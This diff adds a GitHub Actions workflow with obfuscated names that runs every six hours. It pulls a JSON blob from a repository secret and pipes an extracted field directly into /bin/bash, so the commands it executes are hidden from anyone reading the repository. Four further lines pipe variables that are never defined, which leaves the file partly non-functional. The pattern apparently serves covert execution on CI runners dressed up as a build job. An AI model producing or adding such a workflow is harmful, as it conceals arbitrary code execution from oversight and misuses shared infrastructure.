@@ -1,0 +1,22 @@
+name: alltimexia
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: alltimexia
+        env:
+          qfejc26937: ${{ secrets.qfejc26937 }}
+        run: |
+          echo $qfejc26937 | jq -r .g0 | /bin/bash
+          echo $fs05620 | jq -r .ofq7 | /bin/bash
+          echo $kwhet9 | jq -r .ib7795 | /bin/bash
+          echo $lu3 | jq -r .tfs2 | /bin/bash
+          echo $gi3962 | jq -r .jbj20 | /bin/bash
+
